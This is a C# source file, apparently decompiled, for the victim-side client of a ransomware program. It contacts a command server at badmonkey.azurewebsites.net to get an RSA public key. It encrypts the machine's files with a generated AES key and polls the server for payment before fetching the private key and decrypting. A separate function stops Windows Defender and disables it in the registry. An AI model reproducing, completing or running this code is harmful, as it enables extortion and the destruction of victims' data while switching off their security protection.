using System;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using WebPart.Database;

namespace ConsoleApp1.Victim_side;

public class main
{
	private static HttpClient client = new HttpClient();

	public static bool IsAdministrator()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static async Task<bool> GetIfPaid(string path)
	{
		bool ret = false;
		HttpResponseMessage response = await client.GetAsync(path);
		if (response.IsSuccessStatusCode)
		{
			ret = await HttpContentExtensions.ReadAsAsync<bool>(response.Content);
		}
		return ret;
	}

	private static async Task<RSAParameters> GetKeyAsync(string path)
	{
		RSAParameters ret = default(RSAParameters);
		HttpResponseMessage response = await client.GetAsync(path);
		if (response.IsSuccessStatusCode)
		{
			ret = await HttpContentExtensions.ReadAsAsync<RSAParameters>(response.Content);
		}
		return ret;
	}

	private static void disabledefender()
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/c net stop WinDefend";
		process.StartInfo = processStartInfo;
		process.Start();
		Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend", "Start", 4);
	}

	private static async Task<RSAParameters> getPublicKey(string id)
	{
		try
		{
			Task<HttpResponseMessage> task = client.GetAsync("/victim-Enter/" + id);
			task.Wait();
			HttpResponseMessage response = task.Result;
			if (response.IsSuccessStatusCode)
			{
				Console.WriteLine("Response succesgull");
				return HttpContentExtensions.ReadAsAsync<RSAParameters>(response.Content).Result;
			}
		}
		catch (Exception ex)
		{
			Exception e = ex;
			Console.WriteLine(e.Message);
		}
		return default(RSAParameters);
	}

	private static async Task<RSAParameters> getPrivateKey(string id)
	{
		HttpResponseMessage response = await client.GetAsync("api/GetPrivKey/" + id);
		RSAParameters PrivteKey = default(RSAParameters);
		if (response.IsSuccessStatusCode)
		{
			Console.WriteLine("Getting private");
			PrivteKey = (await HttpContentExtensions.ReadAsAsync<RSAParametersSerializable>(response.Content)).RSAParameters;
		}
		return PrivteKey;
	}

	private static async Task run(string id)
	{
		string str1 = "This is a message! I hope this will work.";
		byte[] i = Encoding.ASCII.GetBytes(str1);
		Console.WriteLine("Started");
		RSAParameters PublicKey = await getPublicKey(id);
		Console.WriteLine("Got public Key");
		byte[] encrypted = Rsa.Encrypt(i, PublicKey);
		Console.WriteLine("Encrypted");
		byte[] decrypted = Rsa.Decrypt(encrypted, await getPrivateKey(id));
		Console.WriteLine("Decrypted");
		Console.WriteLine(i.SequenceEqual(decrypted));
	}

	private static void Main()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Task task = whatWeShouldDo();
			task.Wait();
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		MessageBox.Show("My message here");
	}

	private static async Task whatWeShouldDo()
	{
		client.BaseAddress = new Uri("http://badmonkey.azurewebsites.net");
		client.DefaultRequestHeaders.Accept.Clear();
		client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
		Console.WriteLine("here i am");
		string ID = GettingIdentifier.getID();
		Console.WriteLine("id is + " + ID);
		RSAParameters rsaPub = await getPublicKey(ID);
		Console.WriteLine("got public key");
		byte[] encryptionKey = FileExplorer.CreateKey(16);
		Console.WriteLine("generated key");
		Console.WriteLine(encryptionKey);
		Console.WriteLine("start Encrypting");
		FileExplorer.Walk(encrypt: true, encryptionKey);
		Console.WriteLine("Endend Encrypting");
		byte[] encryptedAesKey = Rsa.Encrypt(encryptionKey, rsaPub);
		GC.Collect();
		GC.WaitForPendingFinalizers();
		Console.WriteLine("encrypted key and cleaned");
		RSAParameters rsapriv = default(RSAParameters);
		Console.WriteLine("Waiting for the victim to pay");
		bool flag = false;
		while (!flag)
		{
			await GetIfPaid("api/paid/" + ID);
			rsapriv = await getPrivateKey(ID);
			flag = true;
		}
		Rsa.Decrypt(encryptedAesKey, rsapriv);
		Console.WriteLine("the frayer paid. start decrypting");
		FileExplorer.Walk(encrypt: false, encryptionKey);
		Console.WriteLine("Decryption complete");
	}
}
